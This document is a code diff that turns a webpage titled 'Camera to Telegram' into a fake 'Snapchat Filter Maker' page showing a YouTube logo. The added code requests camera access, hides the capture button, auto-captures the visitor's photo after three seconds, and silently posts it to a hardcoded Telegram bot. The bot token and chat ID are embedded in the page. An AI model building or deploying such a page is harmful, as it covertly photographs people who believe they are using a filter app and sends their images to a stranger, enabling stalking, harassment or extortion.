@@ -1,64 +1,111 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Camera to Telegram</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Snapchat Filter Maker</title>
   <style>
-    body { text-align: center; font-family: sans-serif; margin-top: 20px; }
-    video, canvas { width: 80%; max-width: 400px; margin: 10px; border-radius: 10px; }
-    button { padding: 10px 20px; font-size: 16px; }
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #ffffff;
+      color: #000;
+    }
+
+    header {
+      display: flex;
+      align-items: center;
+      background-color: #ff0000;
+      padding: 10px;
+    }
+
+    header img {
+      height: 30px;
+      margin-right: 10px;
+    }
+
+    header h1 {
+      font-size: 20px;
+      color: white;
+    }
+
+    main {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+    }
+
+    video {
+      width: 90%;
+      max-width: 400px;
+      margin: 20px 0;
+      border-radius: 10px;
+    }
+
+    canvas {
+      display: none;
+    }
+
+    button {
+      display: none;
+    }
   </style>
 </head>
 <body>
 
-  <h2>📸 Take a Photo</h2>
-  <video id="video" autoplay playsinline></video><br>
-  <button onclick="takePhoto()">Capture</button>
-  <canvas id="canvas" style="display: none;"></canvas>
+  <header>
+    <img src="https://www.freepnglogos.com/uploads/youtube-logo-png-hd-20.png" alt="YouTube Logo" />
+    <h1>Snapchat Filter Maker</h1>
+  </header>
+
+  <main>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <button id="captureBtn" onclick="sendPhoto()">Capture</button>
+  </main>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
+    const captureBtn = document.getElementById('captureBtn');
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
-      })
-      .catch(err => {
-        alert("Camera access denied: " + err);
-      });
 
-    function takePhoto() {
+        setTimeout(() => {
+          captureBtn.click();
+        }, 3000); // waits 3 seconds before auto-capturing
+
+      } catch (err) {
+        alert("Camera access denied or not available.");
+      }
+    }
+
+    function sendPhoto() {
       const context = canvas.getContext('2d');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      canvas.toBlob(blob => {
-        sendToTelegram(blob);
-      }, 'image/jpeg', 0.9);
-    }
+      const photo = canvas.toDataURL('image/jpeg');
 
-    function sendToTelegram(blob) {
-      const TOKEN = '7327624845:AAH5wGHCSFiWOvj2jWOU7K6Yk8YunRXqr24';
-      const CHAT_ID = '1193693663';
+      const token = "7327624845:AAH5wGHCSFiWOvj2jWOU7K6Yk8YunRXqr24";
+      const chat_id = "1193693663";
+      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
 
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append('photo', blob, 'photo.jpg');
-
-      fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+      fetch(url, {
         method: 'POST',
-        body: formData
-      })
-      .then(response => response.json())
-      .then(result => {
-        alert('Photo sent to Telegram!');
-      })
-      .catch(error => {
-        alert('Failed to send: ' + error);
+        body: new URLSearchParams({
+          chat_id: chat_id,
+          photo: photo
+        })
       });
     }
-  </script>
 
+    window.onload = startCamera;
+  </script>
 </body>
 </html>
